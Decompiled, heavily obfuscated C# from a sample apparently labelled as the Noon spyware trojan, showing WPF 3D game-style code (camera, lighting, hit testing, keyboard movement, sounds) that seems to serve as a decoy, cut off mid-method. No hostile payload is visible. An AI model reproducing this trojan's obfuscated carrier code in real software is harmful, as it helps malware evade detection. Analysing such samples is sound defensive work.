// Decompiled with JetBrains decompiler
// Type:  
// Assembly: ProgIdRedirectionEn, Version=1.7.3.0, Culture=neutral, PublicKeyToken=null
// MVID: B81F1514-ABAD-442F-0D6D-30821B04B8DB
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\Trojan-Spy.Win32.Noon.bcqy-84d399a3116d4038d5730fdbae6857142c0141f042dbba9a42e8a21e1ce6448b.exe

using \u002D;
using System;
using System.Collections.Generic;
using System.Media;
using System.Runtime.CompilerServices;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Media.Media3D;
using System.Windows.Threading;

public sealed class \u0006\u2000
{
  private List<\u000E\u2003> \u0002;
  public Viewport3D \u0003;
  private Model3DGroup \u0005;
  public Model3DGroup \u0008;
  public Model3DGroup \u0006;
  public Model3DGroup \u000E;
  private GeometryModel3D \u000F;
  private ModelVisual3D \u0002\u2000;
  private PerspectiveCamera \u0003\u2000;
  public bool \u0005\u2000;
  public Dictionary<uint, \u0005\u2001> \u0008\u2000;
  public Dictionary<uint, \u0008\u2001> \u0006\u2000;
  public Dictionary<uint, \u0003\u2007> \u000E\u2000;
  public Dictionary<uint, \u000E\u2006> \u000F\u2000;
  public Dictionary<uint, \u0006\u2001> \u0002\u2001;
  public Dictionary<uint, \u0002\u2005> \u0003\u2001;
  public Dictionary<string, List<\u0006\u2001>> \u0005\u2001;
  private \u0006\u2001 \u0008\u2001;
  private \u0006\u2001 \u0006\u2001;
  private \u0006\u2001 \u000E\u2001;
  private \u0006\u2001 \u000F\u2001;
  private \u0002\u2005 \u0002\u2002;
  public uint \u0003\u2002;
  private I1iIil1Il1II \u0005\u2002;
  public \u000E\u2002 \u0008\u2002;
  public GeometryModel3D \u0006\u2002;

  [MethodImpl(MethodImplOptions.NoInlining)]
  public \u0006\u2000()
  {
    int num1 = 2;
    if (!\u0006\u2000.\u0003())
      goto label_6;
label_1:
    this.\u000E();
    this.\u0002 = \u0005\u2003.\u0002();
    num1 = 5;
label_6:
    while (true)
    {
      int num2;
      DispatcherTimer dispatcherTimer;
      switch (num1)
      {
        case 0:
        case 2:
          \u0003\u2004.\u0002();
          num2 = 10;
          break;
        case 1:
        case 10:
          this.\u0003 = new Viewport3D();
          this.\u0005 = new Model3DGroup();
          this.\u0008 = new Model3DGroup();
          this.\u0006 = new Model3DGroup();
          this.\u000E = new Model3DGroup();
          this.\u000F = new GeometryModel3D();
          this.\u0002\u2000 = new ModelVisual3D();
          this.\u0003\u2000 = new PerspectiveCamera();
          this.\u0005\u2000 = true;
          num2 = 7;
          break;
        case 3:
          this.\u0003\u2001 = new Dictionary<uint, \u0002\u2005>();
          this.\u0005\u2001 = new Dictionary<string, List<\u0006\u2001>>();
          if (\u0006\u2000.\u0002())
          {
            num1 = 9;
            continue;
          }
          goto case 9;
        case 4:
          this.\u0006();
          num2 = 6;
          break;
        case 5:
          this.\u0008();
          this.\u000F();
          this.\u0002\u2000.Content = (Model3D) this.\u0006;
          num2 = 11;
          break;
        case 6:
          goto label_1;
        case 7:
          this.\u0008\u2000 = new Dictionary<uint, \u0005\u2001>();
          this.\u0006\u2000 = new Dictionary<uint, \u0008\u2001>();
          num1 = 8;
          continue;
        case 8:
          this.\u000E\u2000 = new Dictionary<uint, \u0003\u2007>();
          this.\u000F\u2000 = new Dictionary<uint, \u000E\u2006>();
          this.\u0002\u2001 = new Dictionary<uint, \u0006\u2001>();
          num2 = 3;
          break;
        case 9:
          this.\u0003\u2002 = 1U;
          this.\u0005\u2002 = new I1iIil1Il1II();
          // ISSUE: explicit constructor call
          base.\u002Ector();
          goto case 4;
        case 11:
          this.\u0006.Children.Add((Model3D) this.\u0005);
          this.\u0006.Children.Add((Model3D) this.\u0008);
          this.\u0006.Children.Add((Model3D) this.\u000E);
          this.\u0003.Children.Add((Visual3D) this.\u0002\u2000);
          this.\u0005\u2001.Add(\u0005\u2007.\u0002(-1359008800), new List<\u0006\u2001>());
          this.\u0008\u2002 = new \u000E\u2002(this.\u0005\u2002);
          this.\u0005();
          this.\u0003();
          dispatcherTimer = new DispatcherTimer();
          num1 = 12;
          continue;
        case 12:
          dispatcherTimer.Interval = TimeSpan.FromSeconds(0.5);
          dispatcherTimer.Tick += new EventHandler(this.\u0002);
          dispatcherTimer.Start();
          num2 = 13;
          break;
        case 13:
          goto label_15;
        default:
          num1 = 4;
          continue;
      }
      num1 = num2;
    }
label_15:;
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  private void \u0002(object _param1, EventArgs _param2)
  {
    int num = 5;
    if (\u0006\u2000.\u0002())
      goto label_5;
label_1:
    \u0006\u2001 obj;
    obj.\u0008.\u0005.X = 0.0;
    if (!\u0006\u2000.\u0003())
    {
      num = 2;
      goto label_5;
    }
label_2:
    obj = this.\u0006\u2001;
    num = 4;
label_5:
    while (true)
    {
      switch (num)
      {
        case 0:
        case 5:
          goto label_2;
        case 1:
        case 3:
          obj.\u0008.\u0005.Z = 0.0;
          \u0008\u2002.\u0002(ref obj.\u0008, ref obj.\u0006, this);
          if (\u0006\u2000.\u0002())
          {
            num = 6;
            continue;
          }
          goto case 2;
        case 2:
          obj.\u0008.\u0005.Y = 1.0;
          goto case 1;
        case 4:
          goto label_1;
        case 6:
          goto label_7;
        default:
          num = 1;
          continue;
      }
    }
label_7:;
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  public bool \u0002(\u0006\u2000 _param1)
  {
    int num1 = 4;
    bool flag1;
    while (true)
    {
      int num2 = num1;
      Vector3D vector3D1;
      Vector3D vector3D2;
      Rect3D bounds;
      while (true)
      {
        switch (num2)
        {
          case 0:
          case 1:
            goto label_5;
          case 2:
          case 3:
            using (Dictionary<uint, \u0006\u2001>.ValueCollection.Enumerator enumerator = this.\u0002\u2001.Values.GetEnumerator())
            {
label_20:
              while (enumerator.MoveNext())
              {
                \u0006\u2001 current = enumerator.Current;
                int num3 = 3;
                while (true)
                {
                  int num4 = num3;
                  Vector3D direction;
                  bool flag2;
                  while (true)
                  {
                    switch (num4)
                    {
                      case 0:
                      case 3:
                        goto label_16;
                      case 1:
                        direction = vector3D1 - vector3D2;
                        direction.Normalize();
                        bounds = this.\u0006\u2001.\u0008.\u0008.Bounds;
                        goto case 2;
                      case 2:
                      case 4:
                        RayHitTestParameters hitTestParameters = new RayHitTestParameters(bounds.Location, direction);
                        List<Point3D> point3DList = new List<Point3D>();
                        if (\u000F\u2003.\u0002(hitTestParameters, current.\u0008.\u0008.Bounds))
                        {
                          flag2 = \u000F\u2003.\u0002(hitTestParameters, current.\u0008.\u0008.Bounds, ref point3DList, _param1);
                          num4 = 5;
                          continue;
                        }
                        goto label_20;
                      case 5:
                        goto label_18;
                      case 6:
                        goto label_23;
                      default:
                        goto label_13;
                    }
                  }
label_13:
                  num3 = 4;
                  continue;
label_16:
                  if ((int) current.\u0002 != (int) this.\u0006\u2001.\u0002 && (int) current.\u0002 != (int) this.\u000F\u2001.\u0002)
                  {
                    num3 = 1;
                    continue;
                  }
                  goto label_20;
label_18:
                  if (flag2)
                  {
                    flag1 = false;
                    num3 = 6;
                  }
                  else
                    goto label_20;
                }
              }
            }
            flag1 = true;
            if (\u0006\u2000.\u0002())
            {
              num2 = 6;
              continue;
            }
            goto label_23;
          case 4:
            goto label_6;
          case 5:
            Vector3D vector3D3 = new Vector3D();
            vector3D3 = vector3D1 - vector3D2;
            goto case 2;
          case 6:
            goto label_23;
          default:
            goto label_4;
        }
      }
label_4:
      num1 = 2;
      continue;
label_5:
      ref Vector3D local1 = ref vector3D1;
      Point3D location = this.\u000F\u2001.\u0008.\u0008.Bounds.Location;
      double x1 = location.X;
      location = this.\u000F\u2001.\u0008.\u0008.Bounds.Location;
      double y1 = location.Y;
      bounds = this.\u000F\u2001.\u0008.\u0008.Bounds;
      location = bounds.Location;
      double z1 = location.Z;
      local1 = new Vector3D(x1, y1, z1);
      num1 = 5;
      continue;
label_6:
      ref Vector3D local2 = ref vector3D2;
      location = this.\u0006\u2001.\u0008.\u0008.Bounds.Location;
      double x2 = location.X;
      location = this.\u0006\u2001.\u0008.\u0008.Bounds.Location;
      double y2 = location.Y;
      bounds = this.\u0006\u2001.\u0008.\u0008.Bounds;
      location = bounds.Location;
      double z2 = location.Z;
      local2 = new Vector3D(x2, y2, z2);
      num1 = 0;
    }
label_23:
    return flag1;
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  public void \u0002(object _param1, MouseButtonEventArgs _param2)
  {
    int num = 4;
    Point position;
    PointHitTestParameters hitTestParameters1;
    Point3D origin;
    Vector3D direction;
    while (true)
    {
      switch (num)
      {
        case 0:
        case 4:
          position = _param2.GetPosition((IInputElement) this.\u0003);
          num = 5;
          continue;
        case 1:
        case 5:
          origin = new Point3D(position.X, position.Y, 0.0);
          direction = new Vector3D(position.X, position.Y, 10.0);
          num = 3;
          continue;
        case 2:
          VisualTreeHelper.HitTest((Visual) this.\u0003, (HitTestFilterCallback) null, new HitTestResultCallback(this.\u0002), (HitTestParameters) hitTestParameters1);
          num = 6;
          continue;
        case 3:
          hitTestParameters1 = new PointHitTestParameters(position);
          RayHitTestParameters hitTestParameters2 = new RayHitTestParameters(origin, direction);
          goto case 2;
        case 6:
          goto label_7;
        default:
          num = 2;
          continue;
      }
    }
label_7:;
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  public void \u0002()
  {
    int num1 = 6;
    while (true)
    {
      int num2 = num1;
      Point point;
      int z;
      int y;
      while (true)
      {
        bool flag;
        switch (num2)
        {
          case 0:
            if (flag)
            {
              z = -1;
              break;
            }
            goto label_14;
          case 1:
          case 4:
            goto label_8;
          case 2:
          case 3:
label_12:
            flag = y <= 1;
            num2 = 0;
            continue;
          case 5:
            ++z;
            break;
          case 6:
            point = new Point(this.\u0008\u2001.\u0008.\u0003.X, this.\u0008\u2001.\u0008.\u0003.Y);
            num2 = 7;
            continue;
          case 7:
            goto label_2;
          case 8:
            goto label_15;
          case 9:
            goto label_17;
          default:
            goto label_7;
        }
        if (z > 1)
        {
          ++y;
          goto label_12;
        }
        else
          goto label_4;
      }
label_2:
      Point3D origin = this.\u0008\u2001.\u0008.\u0003;
      Vector3D direction = new Vector3D(this.\u000F\u2001.\u0008.\u0003.X - this.\u0008\u2001.\u0008.\u0003.X, this.\u000F\u2001.\u0008.\u0003.Y - this.\u0008\u2001.\u0008.\u0003.Y, this.\u000F\u2001.\u0008.\u0003.Z - this.\u0008\u2001.\u0008.\u0003.Z);
      PointHitTestParameters hitTestParameters1 = new PointHitTestParameters(point);
      RayHitTestParameters hitTestParameters2 = new RayHitTestParameters(origin, direction);
      int x = -1;
      num1 = 8;
      continue;
label_4:
      RayHitTestParameters hitTestParameters3 = new RayHitTestParameters(origin, new Vector3D((double) x, (double) y, (double) z));
      goto label_8;
label_7:
      num1 = 1;
      continue;
label_8:
      VisualTreeHelper.HitTest((Visual) this.\u0003, (HitTestFilterCallback) null, new HitTestResultCallback(this.\u0002), (HitTestParameters) hitTestParameters1);
      num1 = 5;
      continue;
label_14:
      ++x;
label_15:
      if (x > 1)
      {
        VisualTreeHelper.HitTest((Visual) this.\u0003, (HitTestFilterCallback) null, new HitTestResultCallback(this.\u0002), (HitTestParameters) hitTestParameters1);
        num1 = 9;
      }
      else
      {
        y = -1;
        num1 = 2;
      }
    }
label_17:;
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  public HitTestResultBehavior \u0002(HitTestResult _param1)
  {
    int num1 = 0;
    HitTestResultBehavior testResultBehavior;
    while (true)
    {
      RayHitTestResult rayHitTestResult;
      ImageBrush imageBrush;
      GeometryModel3D modelHit;
      Rect3D bounds;
      int num2;
      \u0006\u2001 obj1;
      Dictionary<uint, \u0005\u2001>.Enumerator enumerator;
      switch (num1)
      {
        case 0:
          rayHitTestResult = _param1 as RayHitTestResult;
          num1 = 7;
          continue;
        case 1:
        case 6:
          this.\u0008.Children.Add((Model3D) obj1.\u0008.\u0008);
          if (this.\u0005\u2001[\u0005\u2007.\u0002(-1359008800)] != null)
          {
            this.\u0005\u2001[\u0005\u2007.\u0002(-1359008800)].Add(obj1);
            goto label_10;
          }
          else
            goto label_10;
        case 2:
          try
          {
label_23:
            while (enumerator.MoveNext())
            {
              KeyValuePair<uint, \u0005\u2001> current = enumerator.Current;
              int num3 = 3;
              while (true)
              {
                int num4 = num3;
                \u0005\u2001 obj2;
                while (true)
                {
                  switch (num4)
                  {
                    case 0:
                    case 2:
                      testResultBehavior = HitTestResultBehavior.Continue;
                      int num5 = 5;
                      num4 = \u0006\u2000.\u0003() ? num5 : num5;
                      continue;
                    case 1:
                    case 4:
                      double x1 = obj2.\u0003.X;
                      bounds = modelHit.Bounds;
                      double x2 = bounds.X;
                      int num6;
                      if (x1 == x2)
                      {
                        double y1 = obj2.\u0003.Y;
                        bounds = modelHit.Bounds;
                        double y2 = bounds.Y;
                        if (y1 == y2)
                        {
                          double z = obj2.\u0003.Z;
                          bounds = modelHit.Bounds;
                          double num7 = bounds.Z + 0.1;
                          num6 = z == num7 ? 1 : 0;
                          goto label_18;
                        }
                      }
                      num6 = 0;
label_18:
                      if (num6 == 0)
                        goto label_23;
                      else
                        goto case 0;
                    case 3:
                      goto label_13;
                    case 5:
                      goto label_29;
                    default:
                      goto label_21;
                  }
                }
label_13:
                obj2 = current.Value;
                num3 = 4;
                continue;
label_21:
                num3 = 0;
              }
            }
          }
          finally
          {
            enumerator.Dispose();
          }
          double x = modelHit.Bounds.X;
          double y = modelHit.Bounds.Y;
          bounds = modelHit.Bounds;
          double z1 = bounds.Z + 0.1;
          obj1 = new \u0006\u2001(new Point3D(x, y, z1), (Brush) imageBrush, new Vector3D(0.0, 0.0, 0.0), ref this.\u0003\u2002, this, \u0005\u2007.\u0002(-1359008864));
          num2 = 1;
          break;
        case 3:
        case 4:
          imageBrush = new ImageBrush();
          imageBrush.ImageSource = (ImageSource) new BitmapImage(new Uri(\u0005\u2007.\u0002(-1359008783), UriKind.Relative));
          bounds = modelHit.Bounds;
          goto case 5;
        case 5:
          if (bounds.Z <= 0.0)
          {
            enumerator = this.\u0008\u2000.GetEnumerator();
            num2 = 2;
            break;
          }
          goto label_10;
        case 7:
          if (rayHitTestResult != null && rayHitTestResult is RayMeshGeometry3DHitTestResult geometry3DhitTestResult)
          {
            num1 = 8;
            continue;
          }
          goto label_10;
        case 8:
          modelHit = geometry3DhitTestResult.ModelHit as GeometryModel3D;
          num2 = 4;
          break;
        case 9:
          goto label_29;
        default:
          num2 = 5;
          break;
      }
label_5:
      num1 = num2;
      continue;
label_10:
      testResultBehavior = HitTestResultBehavior.Continue;
      num2 = 9;
      goto label_5;
    }
label_29:
    return testResultBehavior;
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  public void \u0003()
  {
    int num1 = 7;
    while (true)
    {
      Vector3D vector3D1;
      Vector3D vector3D2;
      int num2;
      Point3D location;
      Vector3D vector3D3;
      Vector3D vector3D4;
      switch (num1)
      {
        case 0:
          vector3D1 = vector3D4 - vector3D3;
          vector3D2 = new Vector3D(vector3D3.X - vector3D4.X, vector3D3.Y - vector3D4.Y, vector3D3.Z - vector3D4.Z);
          num2 = 6;
          break;
        case 1:
        case 5:
          this.\u0008\u2002.\u0002();
          if (!\u0006\u2000.\u0003())
          {
            num1 = 8;
            continue;
          }
          goto case 7;
        case 2:
          this.\u0008\u2002.\u000E = \u0005\u2007.\u0002(-1359008976) + this.\u000F\u2001.\u0008.\u0008.Bounds.ToString() + Environment.NewLine;
          \u000E\u2002 obj1 = this.\u0008\u2002;
          string str1 = this.\u0008\u2002.\u000E;
          string str2 = \u0005\u2007.\u0002(-1359009004);
          location = this.\u000F\u2001.\u0008.\u0003;
          string str3 = location.ToString();
          string str4 = str1 + str2 + str3;
          obj1.\u000E = str4;
          this.\u0008\u2002.\u000E = this.\u0008\u2002.\u000E + \u0005\u2007.\u0002(-1359009044) + this.\u0006\u2001.\u0008.\u0008.Bounds.ToString() + Environment.NewLine;
          \u000E\u2002 obj2 = this.\u0008\u2002;
          string str5 = this.\u0008\u2002.\u000E;
          string str6 = \u0005\u2007.\u0002(-1359009082);
          location = this.\u0006\u2001.\u0008.\u0003;
          string str7 = location.ToString();
          string newLine = Environment.NewLine;
          string str8 = str5 + str6 + str7 + newLine;
          obj2.\u000E = str8;
          ref Vector3D local1 = ref vector3D3;
          location = this.\u0006\u2001.\u0008.\u0008.Bounds.Location;
          double x1 = location.X;
          location = this.\u0006\u2001.\u0008.\u0008.Bounds.Location;
          double y1 = location.Y;
          location = this.\u0006\u2001.\u0008.\u0008.Bounds.Location;
          double z1 = location.Z;
          local1 = new Vector3D(x1, y1, z1);
          ref Vector3D local2 = ref vector3D4;
          Rect3D bounds = this.\u000F\u2001.\u0008.\u0008.Bounds;
          location = bounds.Location;
          double x2 = location.X;
          bounds = this.\u000F\u2001.\u0008.\u0008.Bounds;
          location = bounds.Location;
          double y2 = location.Y;
          location = this.\u000F\u2001.\u0008.\u0008.Bounds.Location;
          double z2 = location.Z;
          local2 = new Vector3D(x2, y2, z2);
          vector3D1 = new Vector3D();
          num1 = 0;
          continue;
        case 3:
        case 6:
          vector3D2.Negate();
          goto case 4;
        case 4:
          this.\u0008\u2002.\u000E = this.\u0008\u2002.\u000E + \u0005\u2007.\u0002(-1359008847) + vector3D1.ToString() + Environment.NewLine;
          this.\u0008\u2002.\u000E = this.\u0008\u2002.\u000E + \u0005\u2007.\u0002(-1359008869) + vector3D2.ToString() + Environment.NewLine;
          num2 = 1;
          break;
        case 7:
          \u000E\u2002 obj3 = this.\u0008\u2002;
          location = this.\u000F\u2001.\u0008.\u0003;
          string str9 = location.ToString() ?? string.Empty;
          obj3.\u0003 = str9;
          this.\u0008\u2002.\u0005 = this.\u000F\u2001.\u0008.\u0008.Bounds.ToString() ?? string.Empty;
          this.\u0008\u2002.\u0008 = this.\u0002.Count.ToString() ?? string.Empty;
          this.\u0008\u2002.\u000E = \u0005\u2007.\u0002(-1359008939);
          num1 = 2;
          continue;
        case 8:
          goto label_10;
        default:
          num2 = 4;
          break;
      }
      num1 = num2;
    }
label_10:;
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  private void \u0005()
  {
    int num1 = 5;
    while (true)
    {
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 0:
          case 5:
            goto label_1;
          case 1:
            goto label_2;
          case 2:
          case 4:
            goto label_4;
          case 3:
            this.\u0005\u2002.Left = 30.0;
            this.\u0005\u2002.Height = 930.0;
            num2 = 4;
            continue;
          case 6:
            goto label_9;
          default:
            if (\u0006\u2000.\u0002())
            {
              num2 = 1;
              continue;
            }
            goto label_8;
        }
      }
label_1:
      this.\u0005\u2002.Top = 30.0;
      num1 = 3;
      continue;
label_2:
      this.\u0005\u2002.Show();
      this.\u0005\u2002.\u0002.Height = 900.0;
      this.\u0005\u2002.\u0002.Width = 300.0;
      num1 = 6;
      continue;
label_4:
      this.\u0005\u2002.Width = 330.0;
      goto label_2;
    }
label_9:
    return;
label_8:;
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  private void \u0008()
  {
    int num1 = 5;
    while (true)
    {
      int num2;
      ImageBrush imageBrush1;
      ImageBrush imageBrush2;
      switch (num1)
      {
        case 0:
        case 5:
          imageBrush1 = new ImageBrush();
          num2 = 9;
          break;
        case 1:
        case 4:
          this.\u0002\u2002 = new \u0002\u2005(new Point3D(5.0, 5.0, 0.1), (Brush) new ImageBrush()
          {
            ImageSource = (ImageSource) new BitmapImage(new Uri(\u0005\u2007.\u0002(-1359009232), UriKind.Relative))
          }, new Vector3D(0.0, 0.0, 0.0), ref this.\u0003\u2002, this, \u0005\u2007.\u0002(-1359009307));
          goto case 8;
        case 2:
          imageBrush2.ImageSource = (ImageSource) new BitmapImage(new Uri(\u0005\u2007.\u0002(-1359009302), UriKind.Relative));
          int num3 = 3;
          num1 = \u0006\u2000.\u0003() ? num3 : num3;
          continue;
        case 3:
          this.\u0002\u2002 = new \u0002\u2005(new Point3D(7.0, 5.0, 0.1), (Brush) imageBrush2, new Vector3D(0.0, 0.0, 0.0), ref this.\u0003\u2002, this, \u0005\u2007.\u0002(-1359009320));
          this.\u0008.Children.Add((Model3D) this.\u0002\u2002.\u0008.\u0008);
          num2 = 10;
          break;
        case 6:
          this.\u000F\u2001 = new \u0006\u2001(new Point3D(1.0, 1.0, 0.1), (Brush) imageBrush1, new Vector3D(0.0, 0.0, 0.0), ref this.\u0003\u2002, this, \u0005\u2007.\u0002(-1359009062));
          this.\u0008.Children.Add((Model3D) this.\u000F\u2001.\u0008.\u0008);
          this.\u000F\u2001.\u000E.\u0003.\u0008 = 1.0;
          this.\u000F\u2001.\u000E.\u0003.\u0002 = 1.0;
          this.\u0008\u2001 = new \u0006\u2001(new Point3D(6.0, 3.0, 0.1), (Brush) new ImageBrush()
          {
            ImageSource = (ImageSource) new BitmapImage(new Uri(\u0005\u2007.\u0002(-1359009105), UriKind.Relative))
          }, new Vector3D(0.0, 0.0, 0.0), ref this.\u0003\u2002, this, \u0005\u2007.\u0002(-1359008864));
          this.\u0008.Children.Add((Model3D) this.\u0008\u2001.\u0008.\u0008);
          this.\u0006\u2001 = new \u0006\u2001(new Point3D(3.0, 8.0, 0.1), (Brush) new ImageBrush()
          {
            ImageSource = (ImageSource) new BitmapImage(new Uri(\u0005\u2007.\u0002(-1359009143), UriKind.Relative))
          }, new Vector3D(0.0, 0.0, 0.0), ref this.\u0003\u2002, this, \u0005\u2007.\u0002(-1359009161));
          this.\u0008.Children.Add((Model3D) this.\u0006\u2001.\u0008.\u0008);
          this.\u000E\u2001 = new \u0006\u2001(new Point3D(2.0, 3.0, 0.1), (Brush) Brushes.Yellow, new Vector3D(0.0, 0.0, 0.0), ref this.\u0003\u2002, this, \u0005\u2007.\u0002(-1359009216));
          num2 = 7;
          break;
        case 7:
          this.\u0008.Children.Add((Model3D) this.\u000E\u2001.\u0008.\u0008);
          num2 = 1;
          break;
        case 8:
          this.\u0002\u2002.\u0006.\u0003 = true;
          this.\u0008.Children.Add((Model3D) this.\u0002\u2002.\u0008.\u0008);
          imageBrush2 = new ImageBrush();
          num1 = 2;
          continue;
        case 9:
          imageBrush1.ImageSource = (ImageSource) new BitmapImage(new Uri(\u0005\u2007.\u0002(-1359009199), UriKind.Relative));
          num2 = 6;
          break;
        case 10:
          goto label_11;
        default:
          num2 = 8;
          break;
      }
      num1 = num2;
    }
label_11:;
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  private void \u0006()
  {
    int num1 = 4;
    while (true)
    {
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 0:
          case 4:
            goto label_6;
          case 1:
          case 3:
            this.\u0003\u2000.LookDirection = new Vector3D(0.0, 0.5, -1.0);
            this.\u0003\u2000.FieldOfView = 60.0;
            goto case 2;
          case 2:
            this.\u0003.Camera = (Camera) this.\u0003\u2000;
            num2 = 5;
            continue;
          case 5:
            goto label_7;
          default:
            goto label_5;
        }
      }
label_5:
      num1 = 2;
      continue;
label_6:
      this.\u0003\u2000.Position = new Point3D(10.0, -6.0, 30.0);
      num1 = 3;
    }
label_7:;
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  private void \u000E()
  {
    int num1 = 5;
    while (true)
    {
      int num2 = num1;
      DirectionalLight directionalLight;
      while (true)
      {
        switch (num2)
        {
          case 0:
          case 5:
            directionalLight = new DirectionalLight();
            if (!\u0006\u2000.\u0003())
            {
              num2 = 3;
              continue;
            }
            goto label_8;
          case 1:
          case 3:
            goto label_2;
          case 2:
            this.\u0005.Children.Add((Model3D) directionalLight);
            num2 = 6;
            continue;
          case 4:
            this.\u0005.Children.Add((Model3D) directionalLight);
            directionalLight = new DirectionalLight();
            directionalLight.Color = Colors.Honeydew;
            directionalLight.Direction = new Vector3D(-0.61, -0.5, -0.61);
            goto case 2;
          case 6:
            goto label_10;
          default:
            if (!\u0006\u2000.\u0003())
            {
              num2 = 2;
              continue;
            }
            goto case 0;
        }
      }
label_2:
      directionalLight.Color = Colors.White;
      directionalLight.Direction = new Vector3D(-0.61, -0.5, -0.61);
      num1 = 4;
    }
label_10:
    return;
label_8:;
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  private void \u000F()
  {
    using (List<\u000E\u2003>.Enumerator enumerator = this.\u0002.GetEnumerator())
    {
label_6:
      while (enumerator.MoveNext())
      {
        \u000E\u2003 current = enumerator.Current;
        int num = 2;
        while (true)
        {
          switch (num)
          {
            case 0:
            case 2:
              goto label_3;
            case 1:
            case 3:
              goto label_6;
            default:
              num = 3;
              continue;
          }
        }
label_3:
        this.\u0005.Children.Add((Model3D) current.\u0005);
      }
    }
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  public \u000E\u2003 \u0002(Point3D _param1)
  {
    int num1 = 2;
    List<\u000E\u2003>.Enumerator enumerator;
    while (true)
    {
      switch (num1)
      {
        case 0:
        case 2:
          enumerator = this.\u0002.GetEnumerator();
          num1 = 3;
          continue;
        case 1:
        case 3:
          goto label_1;
        case 4:
          goto label_18;
        default:
          int num2 = 4;
          num1 = \u0006\u2000.\u0003() ? num2 : num2;
          continue;
      }
    }
label_1:
    \u000E\u2003 obj;
    try
    {
label_12:
      while (enumerator.MoveNext())
      {
        \u000E\u2003 current = enumerator.Current;
        int num3 = 3;
        if (\u0006\u2000.\u0003())
          ;
        while (true)
        {
          int num4;
          bool flag;
          switch (num3)
          {
            case 0:
            case 3:
              if (current.\u0002.X == _param1.X)
              {
                num4 = 4;
                break;
              }
              goto label_12;
            case 1:
            case 4:
              if (current.\u0002.Y == _param1.Y)
              {
                flag = current.\u0002.Z == _param1.Z;
                goto case 2;
              }
              else
                goto label_12;
            case 2:
              if (flag)
              {
                obj = current;
                num3 = 5;
                continue;
              }
              goto label_12;
            case 5:
              goto label_18;
            default:
              num4 = 2;
              break;
          }
          num3 = num4;
        }
      }
    }
    finally
    {
      enumerator.Dispose();
    }
    obj = (\u000E\u2003) null;
label_18:
    return obj;
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  public void \u0002(object _param1, KeyEventArgs _param2)
  {
    int num1 = 12;
    while (true)
    {
      int num2 = num1;
      bool flag1;
      \u000E\u2003 obj;
      bool flag2;
      SoundPlayer soundPlayer1;
      SoundPlayer soundPlayer2;
      bool flag3;
      bool flag4;
      bool flag5;
      SoundPlayer soundPlayer3;
      while (true)
      {
        bool flag6;
        bool flag7;
        switch (num2)
        {
          case 0:
            goto label_1;
          case 1:
            obj.\u0002.Y = this.\u000F\u2001.\u0008.\u0003.Y;
            obj.\u0002.Z = this.\u000F\u2001.\u0008.\u0003.Z - 0.1;
            obj.\u0003 = (Brush) Brushes.DarkGray;
            flag1 = this.\u0002(obj.\u0002) != null;
            if (\u0006\u2000.\u0002())
            {
              num2 = 0;
              continue;
            }
            goto case 5;
          case 2:
            soundPlayer3.Play();
            goto case 11;
          case 3:
            if (flag7)
            {
              obj = new \u000E\u2003(\u0003\u2001.\u0003(new Point3D(this.\u000F\u2001.\u0008.\u0003.X, this.\u000F\u2001.\u0008.\u0003.Y, this.\u000F\u2001.\u0008.\u0003.Z - 0.1), (Brush) Brushes.DarkGreen));
              obj.\u0002.X = this.\u000F\u2001.\u0008.\u0003.X;
              int num3 = 1;
              num2 = \u0006\u2000.\u0003() ? num3 : num3;
              continue;
            }
            goto label_51;
          case 4:
            if (!flag3)
            {
              if (_param2.Key != Key.W)
                goto case 11;
              else
                goto label_15;
            }
            else
              goto label_21;
          case 5:
          case 10:
            this.\u000F\u2001.\u0008.\u0005.Z = 0.0;
            \u0008\u2002.\u0002(ref this.\u000F\u2001.\u0008, ref this.\u000F\u2001.\u0006, this);
            soundPlayer2 = new SoundPlayer(Environment.CurrentDirectory + \u0005\u2007.\u0002(-1359009363));
            num2 = 19;
            continue;
          case 6:
            goto label_30;
          case 7:
            if (!flag2)
              break;
            goto label_10;
          case 8:
            goto label_6;
          case 9:
          case 21:
            soundPlayer1.Play();
            goto case 11;
          case 11:
            if (_param2.Key != Key.Down)
            {
              if (_param2.Key != Key.Left)
              {
                flag6 = _param2.Key == Key.Right;
                goto case 13;
              }
              else
                goto label_35;
            }
            else
              goto label_28;
          case 12:
            goto label_8;
          case 13:
            if (!flag6)
            {
              if (_param2.Key != Key.Up)
              {
                flag7 = _param2.Key == Key.Space;
                if (!\u0006\u2000.\u0003())
                {
                  num2 = 3;
                  continue;
                }
                goto label_8;
              }
              else
              {
                this.\u000F\u2001.\u0008.\u0005.X = 0.0;
                this.\u000F\u2001.\u0008.\u0005.Y = 1.0;
                if (\u0006\u2000.\u0002())
                {
                  num2 = 23;
                  continue;
                }
                goto case 9;
              }
            }
            else
              goto label_5;
          case 14:
            if (!flag4)
            {
              int num4 = (int) MessageBox.Show(\u0005\u2007.\u0002(-1359009469));
              break;
            }
            break;
          case 15:
            goto label_40;
          case 16:
            this.\u0005.Children.Add((Model3D) obj.\u0005);
            if (\u0006\u2000.\u0002())
            {
              num2 = 22;
              continue;
            }
            goto label_30;
          case 17:
          case 22:
            goto label_51;
          case 18:
            goto label_12;
          case 19:
            goto label_33;
          case 20:
            this.\u0008\u2001.\u0008.\u0005.Y = 0.0;
            this.\u0008\u2001.\u0008.\u0005.Z = 0.0;
            \u0008\u2002.\u0002(ref this.\u0008\u2001.\u0008, ref this.\u0008\u2001.\u0006, this);
            new SoundPlayer(Environment.CurrentDirectory + \u0005\u2007.\u0002(-1359009389)).Play();
            goto case 11;
          case 23:
            goto label_22;
          case 24:
            goto label_47;
          default:
            goto label_39;
        }
        if (_param2.Key == Key.S)
        {
          this.\u0008\u2001.\u0008.\u0005 = \u0005\u2006.ExcludeConfig();
